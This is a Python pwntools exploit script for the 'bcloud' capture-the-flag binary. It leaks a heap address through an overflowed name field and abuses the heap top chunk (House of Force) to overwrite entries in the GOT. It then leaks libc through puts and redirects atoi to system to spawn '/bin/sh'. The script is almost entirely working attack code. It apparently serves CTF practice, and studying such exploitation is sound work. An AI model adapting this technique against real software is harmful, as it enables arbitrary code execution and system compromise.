#!/usr/bin/env python
# coding=utf-8
# Author : huzai24601
from pwn import *
from LibcSearcher import *
#context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
elf = ELF('./bcloud')
context(arch=elf.arch,os='linux',log_level='debug')
p=process(elf.path)
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
local_libc_64  = ELF('/lib/x86_64-linux-gnu/libc.so.6')
s=lambda data :p.send(data)
sa=lambda delim,data :p.sendafter(delim, data)
sl=lambda data :p.sendline(data)
sla=lambda delim,data :p.sendlineafter(delim, data) 
r=lambda numb=4096 :p.recv(numb)
ru=lambda delims :p.recvuntil(delims)
uu64=lambda data :u64(data.ljust(8,'\x00'))
leak=lambda name,addr :log.success('{} ===> {:#x}'.format(name, addr))

def debug():
    gdb.attach(p)
    pause()
    pass
def inti(name,org,host):
    sa('Input your name:\n',name)
    heap_base = u32(ru('!')[-5:-1])-8
    leak("heap_base",heap_base)
    sa('Org:\n',org)
    sa('Host:\n',host)
    return heap_base

def add(size,cont):
    sla('>>\n','1')
    sla('content:\n',str(size))
    if len(cont)==64:
        sa('content:\n',cont)
    else:
        sla('content:\n',cont)

def edit(index,cont):
    sla('>>\n','3')
    sla('id:\n',str(index))
    if len(cont)==64:
        sa('content:\n',cont)
    else:
        sla('content:\n',cont)

def remove(index):
    sla('>>\n','4')
    sla('id:\n',str(index))

heap_base = inti('\xff'*64,'\xff'*64,'\xff'*64)
add(0x10,'0')
add(0x10,'1')
add(0x10,'2')
add(0x10,'3')
top_chunk = heap_base + 0x138
ptr = 0x804b120
offset = ptr-0x10 - top_chunk
leak("offset",offset)
add(offset,'0'*8)
add(0x68,p32(elf.got['free'])*2+p32(elf.got['atoi'])*4)
edit(1,p32(elf.plt['puts']))
remove(2)
atoi = u32(r(4))
leak("atoi",atoi)
libc_base = atoi-libc.sym['atoi']
leak('libc_base',libc_base)
one = libc_base + 0x5fbd6
system = libc_base + libc.sym['system']
leak("system",system)
edit(3,p32(system))
s('/bin/sh\x00')
p.interactive()
